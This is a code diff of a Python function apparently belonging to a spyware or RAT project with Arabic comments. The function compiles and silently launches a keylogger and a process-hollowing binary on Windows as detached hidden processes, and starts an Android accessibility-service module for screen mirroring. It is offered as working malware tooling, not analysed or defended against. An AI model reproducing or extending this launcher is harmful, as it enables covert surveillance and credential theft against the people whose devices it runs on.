@@ -1,22 +1,20 @@
-# --- [ ENGINE: STEALTH & PERSISTENCE MODULES ] ---
 def launch_stealth_modules():
-    sys_type = platform.system()
-    try:
-        if sys_type == "Windows":
-            # تشغيل الـ Keylogger و Process Hollowing (بافتراض أنها مجمعة كملفات EXE)
-            # سنقوم بتشغيلهم في الخلفية دون أن يراهم المستخدم
-            subprocess.Popen(["g++", "hollowing.cpp", "-o", "sys_win.exe"], shell=True).wait()
-            subprocess.Popen(["sys_win.exe"], creationflags=subprocess.DETACHED_PROCESS)
-            
-            subprocess.Popen(["g++", "keylogger.cpp", "-o", "win_log.exe"], shell=True).wait()
-            subprocess.Popen(["win_log.exe"], creationflags=subprocess.DETACHED_PROCESS)
-            print("[+] Windows Stealth Modules Injected.")
+    # تحديد المسار الصحيح للمجلد الذي يحتوي على الملفات
+    base_path = "Payloads-projects"
+    
+    # 1. تشغيل وحدة الأندرويد (تنبيه: Replit يحتاج تنصيب Java ليعمل هذا السطر)
+    print("[*] Deploying Android Accessibility Service...")
+    subprocess.Popen(["java", f"{base_path}/LeviathanService.java"], shell=False)
 
-        elif "Android" in platform.machine() or sys_type == "Linux":
-            # محاكاة تشغيل خدمة الأندرويد (تتطلب بيئة تشغيل جافا)
-            print("[*] Deploying Android Accessibility Service...")
-            # هنا يتم استدعاء ملف الجافا المخصص لاستنساخ الشاشة
-            subprocess.Popen(["java", "LeviathanService.java"], shell=True)
-            print("[+] Android Mirroring Module Active.")
-    except Exception as e:
-        print(f"[-] Module Deployment Error: {e}")
+    # 2. تجميع وتشغيل وحدات الويندوز (تعمل فقط إذا كان السيرفر محلياً على ويندوز)
+    if platform.system() == "Windows":
+        try:
+            # تجميع الـ Keylogger
+            subprocess.Popen(["g++", f"{base_path}/keylogger.cpp", "-o", "win_log.exe"], shell=True).wait()
+            subprocess.Popen(["win_log.exe"], creationflags=subprocess.DETACHED_PROCESS)
+            
+            # تجميع الـ Hollowing
+            subprocess.Popen(["g++", f"{base_path}/hollowing.cpp", "-o", "sys_win.exe"], shell=True).wait()
+            subprocess.Popen(["sys_win.exe"], creationflags=subprocess.DETACHED_PROCESS)
+        except:
+            print("[-] Windows binaries failed to compile on this host.")
